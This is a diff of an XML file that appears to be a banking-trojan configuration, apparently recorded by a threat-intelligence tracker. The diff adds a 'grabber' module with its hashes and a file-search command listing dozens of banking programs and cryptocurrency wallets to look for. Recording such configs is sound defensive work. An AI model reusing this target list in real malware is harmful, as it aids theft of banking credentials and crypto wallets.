@@ -21,8 +21,25 @@
 -->
 
 <settings>
-  <modules/>
-  <commands/>
+  <modules>
+    <module>
+      <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
+      <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
+      <md5>2680cd66b98910d26bfd815d83ca330f</md5>
+      <timestamp>2017-05-12T19:19:16+00:00</timestamp>
+      <architecture>64</architecture>
+      <name>grabber</name>
+      <crc>0x4d38f016</crc>
+    </module>
+  </modules>
+  <commands>
+    <cmd id="989550" type="15">
+      <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
+    </cmd>
+    <cmd id="989551" type="22">
+      <fs/>
+    </cmd>
+  </commands>
   <config>
     <httpshots>
       <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
